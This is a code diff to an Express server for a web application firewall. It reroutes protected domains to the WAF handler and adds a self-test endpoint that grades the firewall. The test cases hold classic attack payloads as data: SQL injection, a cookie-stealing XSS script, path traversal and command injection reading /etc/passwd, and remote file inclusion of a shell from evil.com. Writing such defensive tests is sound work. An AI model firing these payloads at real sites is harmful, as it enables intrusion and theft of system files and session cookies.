@@ -166,10 +166,12 @@ if (wafProxyCore && domainRegistry) {
 // ─── Middleware ───────────────────────────────────────────────────────────────
 app.use((req, res, next) => {
   const host = (req.headers.host || '').split(':')[0].toLowerCase();
-  const isDashboard = DASHBOARD_HOSTS.has(host) || host.includes('hf.space') || host.includes('.local') || !domainRegistry;
-  if (!isDashboard && wafProxyHandler && domainRegistry && domainRegistry.lookup(host)) {
+  // If this host is a registered WAF domain, ALWAYS route to the WAF handler
+  // (even on hf.space — the WAF must fire for protected domains)
+  if (wafProxyHandler && domainRegistry && domainRegistry.lookup(host)) {
     return wafProxyHandler(req, res);
   }
+  // Otherwise, serve the dashboard
   next();
 });
 app.use(express.json({ limit: '10mb' }));
@@ -1098,6 +1100,109 @@ app.get('/api/waf/logs', (req, res) => {
   if (req.query.domain) result = result.filter(l => l.host === req.query.domain);
   if (req.query.blocked === 'true') result = result.filter(l => l.blocked);
   res.json(result.slice(0, parseInt(req.query.limit || '200', 10)));
+});
+
+// ─── WAF Firewall Test ─────────────────────────────────────────────────────
+app.post('/api/waf/test/:domain', (req, res) => {
+  if (!domainRegistry) return res.status(500).json({ error: 'Domain registry not loaded.' });
+  if (!wafEngine)      return res.status(500).json({ error: 'WAF engine not loaded.' });
+
+  const domain = decodeURIComponent(req.params.domain);
+  const entry  = domainRegistry.lookup(domain);
+  if (!entry) return res.status(404).json({ error: `Domain "${domain}" is not registered.` });
+
+  const tests = [
+    {
+      name: 'Clean Request',
+      expectBlock: false,
+      req: { url: '/', method: 'GET', headers: { host: domain, 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120' } },
+      body: ''
+    },
+    {
+      name: 'SQL Injection',
+      expectBlock: true,
+      req: { url: "/search?q=1' OR '1'='1", method: 'GET', headers: { host: domain, 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120' } },
+      body: ''
+    },
+    {
+      name: 'Cross-Site Scripting (XSS)',
+      expectBlock: true,
+      req: { url: '/comment?text=<script>alert(document.cookie)</script>', method: 'GET', headers: { host: domain, 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120' } },
+      body: ''
+    },
+    {
+      name: 'Path Traversal',
+      expectBlock: true,
+      req: { url: '/files?path=../../../etc/passwd', method: 'GET', headers: { host: domain, 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120' } },
+      body: ''
+    },
+    {
+      name: 'Command Injection',
+      expectBlock: true,
+      req: { url: '/api?cmd=; cat /etc/passwd', method: 'GET', headers: { host: domain, 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120' } },
+      body: ''
+    },
+    {
+      name: 'Remote File Inclusion',
+      expectBlock: true,
+      req: { url: '/page?file=http://evil.com/shell.php', method: 'GET', headers: { host: domain, 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120' } },
+      body: ''
+    },
+    {
+      name: 'Bot / Scanner Detection',
+      expectBlock: true,
+      req: { url: '/', method: 'GET', headers: { host: domain, 'user-agent': 'sqlmap/1.6' } },
+      body: ''
+    }
+  ];
+
+  const results = tests.map(t => {
+    let blocked = false;
+    let ruleId  = null;
+    let category = null;
+
+    // Check bot detection first
+    if (t.req.headers['user-agent'] && entry.rules.botDetection && wafEngine.checkBotSignature) {
+      const bot = wafEngine.checkBotSignature(t.req.headers['user-agent']);
+      if (bot.isBot) {
+        blocked  = true;
+        category = 'Bot/Scanner';
+        ruleId   = bot.botName;
+      }
+    }
+
+    // Check WAF rules
+    if (!blocked && wafEngine.inspectRequest) {
+      const result = wafEngine.inspectRequest(t.req, t.body, entry.rules);
+      if (result.blocked) {
+        blocked  = true;
+        ruleId   = result.ruleId;
+        category = result.category;
+      }
+    }
+
+    const pass = t.expectBlock ? blocked : !blocked;
+
+    return {
+      name: t.name,
+      expectBlock: t.expectBlock,
+      blocked,
+      ruleId,
+      category,
+      pass
+    };
+  });
+
+  const passCount = results.filter(r => r.pass).length;
+
+  res.json({
+    domain,
+    total: tests.length,
+    passed: passCount,
+    failed: tests.length - passCount,
+    grade: passCount === tests.length ? 'A+' : passCount >= tests.length - 1 ? 'A' : passCount >= tests.length - 2 ? 'B' : 'F',
+    results
+  });
 });
 
 app.get('/api/waf/stats', (req, res) => {
